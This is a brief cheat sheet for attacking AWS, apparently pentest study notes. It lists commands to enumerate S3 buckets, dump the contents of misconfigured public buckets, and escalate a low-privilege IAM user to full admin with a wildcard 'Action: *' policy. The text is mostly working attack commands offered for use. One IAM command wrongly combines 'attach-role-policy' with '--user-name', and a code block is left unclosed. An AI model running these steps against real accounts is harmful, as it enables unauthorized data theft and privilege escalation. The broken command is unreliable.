## Cloud Computing

### S3 Bucket Enumeration
1. lazys3 (github)
   - `ruby lazys3.rb <COMPANY/KEYWORD>`
     - List all buckets and http status code
2. s3scanner (github)
   - Install
     - `pip3 install s3scanner`
   - Enumerate buckets list:
     - `s3scanner scan -f names.txt`
3. Browser
   - Go to `<bucket-name>.s3.amazonaws.com` XML file of the bucket will be displayed

### Exploit misconfigured S3 buckets
1. AWS CLI
   - Install: `apt install awscli`
   - List contents: `aws s3 ls s3://<bucket-name> --no-sign-request`
   - Download contents: `aws s3 cp s3://<bucket-name> <local-path> --recursive --no-sign-request`
2. s3scanner
   - Install
     - `pip3 install s3scanner`
   - Check if bucket exists and list permissions: 
     - `s3scanner scan -b <bucket-name>`
   - Dump bucket contents: 
     - `s3scanner dump -b <bucket-name> -d <path>`

### Exploit misconfigured IAM roles
- Configure AWS CLI with access key and secret key of low level user
  - `aws configure`
- create file policy.json
  ```
  {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
  }
- `aws iam create-policy --policy-name <policy-name> --policy-document file://policy.json`
- `aws iam attach-role-policy --user-name <user-name> --policy-arn <policy-arn-from-previous-command>`
- `aws iam list-users` to verify by listing users

AWS S3 hacking
- Lazys3
- S3Scanner